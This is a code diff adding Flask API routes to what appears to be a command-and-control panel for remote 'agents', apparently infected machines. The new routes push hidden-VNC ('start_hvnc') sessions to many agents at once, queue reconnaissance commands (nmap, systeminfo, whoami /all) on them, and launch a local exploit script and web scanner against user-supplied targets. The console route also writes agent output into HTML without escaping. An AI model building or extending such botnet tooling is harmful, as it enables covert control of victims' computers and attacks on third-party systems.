@@ -297,3 +297,179 @@ def push_command(agent_id):
 
     agent.push_command(cmdline)
     return jsonify({'ok': True, 'queued_for': agent_id})
+
+
+# Get agent console output (used by agent_detail.html)
+@api.route('/agents/<int:agent_id>/console', methods=['GET'])
+def agent_console(agent_id):
+    """
+    Get the console output for a specific agent.
+    Returns the agent's output as HTML formatted text.
+    """
+    agent = Agent.query.get(agent_id)
+    if not agent:
+        abort(404)
+    
+    # Format the output as HTML with proper styling
+    output = agent.output or ''
+    
+    # Convert newlines to <br> tags and wrap in a styled div
+    formatted_output = output.replace('\n', '<br>')
+    
+    html_output = f'''
+    <div id="termtext" style="
+        background-color: #000; 
+        color: #00ff00; 
+        font-family: 'Courier New', monospace; 
+        padding: 10px; 
+        height: 400px; 
+        overflow-y: auto; 
+        border: 1px solid #333;
+        white-space: pre-wrap;
+    ">
+        {formatted_output}
+    </div>
+    '''
+    
+    return html_output
+
+
+@api.route('/mass-hvnc', methods=['POST'])
+def mass_hvnc():
+    """Launch HVNC on multiple agents"""
+    try:
+        payload = request.form or (request.is_json and request.get_json(silent=True)) or {}
+        agent_ids = payload.get('agents', [])
+        
+        if not agent_ids:
+            return jsonify({'error': 'No agents selected'}), 400
+        
+        # Launch HVNC command on selected agents
+        success_count = 0
+        for agent_id in agent_ids:
+            agent = Agent.query.get(agent_id)
+            if agent and agent.is_online():
+                # Send HVNC launch command
+                agent.push_command('start_hvnc')
+                success_count += 1
+        
+        return jsonify({
+            'success': True,
+            'message': f'HVNC launched on {success_count} agents',
+            'launched_count': success_count
+        })
+    
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@api.route('/mass-scan', methods=['POST'])
+def mass_scan():
+    """Launch scan on multiple agents"""
+    try:
+        payload = request.form or (request.is_json and request.get_json(silent=True)) or {}
+        agent_ids = payload.get('agents', [])
+        scan_type = payload.get('scan_type', 'web')
+        
+        if not agent_ids:
+            return jsonify({'error': 'No agents selected'}), 400
+        
+        # Generate unique scan ID
+        import uuid
+        scan_id = str(uuid.uuid4())
+        
+        # Launch scan command on selected agents
+        success_count = 0
+        scan_commands = {
+            'web': f'python ../../eklentiler/Pegasus-Scan-Web-Total/main.py -u http://target.com --scan-id {scan_id}',
+            'network': f'nmap -sS -O target_network --scan-id {scan_id}',
+            'system': f'systeminfo && whoami /all --scan-id {scan_id}'
+        }
+        
+        command = scan_commands.get(scan_type, scan_commands['web'])
+        
+        for agent_id in agent_ids:
+            agent = Agent.query.get(agent_id)
+            if agent and agent.is_online():
+                agent.push_command(command)
+                success_count += 1
+        
+        return jsonify({
+            'success': True,
+            'message': f'{scan_type} scan launched on {success_count} agents',
+            'scan_id': scan_id,
+            'launched_count': success_count
+        })
+    
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@api.route('/tools/exploit/launch', methods=['POST'])
+def launch_exploit():
+    """Launch exploit framework"""
+    try:
+        payload = request.form or (request.is_json and request.get_json(silent=True)) or {}
+        target = payload.get('target')
+        exploit_type = payload.get('exploit_type', 'bts_api')
+        
+        if not target:
+            return jsonify({'error': 'Target is required'}), 400
+        
+        # Launch exploit command
+        import subprocess
+        import os
+        
+        exploit_path = os.path.join('..', '..', 'eklentiler', 'expoit', 'main.py')
+        cmd = ['python', exploit_path, '--target', target]
+        
+        # Run exploit in background
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        return jsonify({
+            'success': True,
+            'message': 'Exploit launched successfully',
+            'process_id': process.pid
+        })
+    
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@api.route('/tools/web-scanner/launch', methods=['POST'])
+def launch_web_scanner():
+    """Launch web vulnerability scanner"""
+    try:
+        payload = request.form or (request.is_json and request.get_json(silent=True)) or {}
+        target_url = payload.get('url')
+        scan_options = payload.get('options', {})
+        
+        if not target_url:
+            return jsonify({'error': 'Target URL is required'}), 400
+        
+        # Launch web scanner
+        import subprocess
+        import os
+        
+        scanner_path = os.path.join('..', '..', 'eklentiler', 'Pegasus-Scan-Web-Total', 'main.py')
+        cmd = ['python', scanner_path, '-u', target_url]
+        
+        # Add optional parameters
+        if scan_options.get('threads'):
+            cmd.extend(['-t', str(scan_options['threads'])])
+        if scan_options.get('wordlist'):
+            cmd.extend(['-w', scan_options['wordlist']])
+        if scan_options.get('output'):
+            cmd.extend(['-o', scan_options['output']])
+        
+        # Run scanner in background
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        return jsonify({
+            'success': True,
+            'message': 'Web scanner launched successfully',
+            'process_id': process.pid
+        })
+    
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
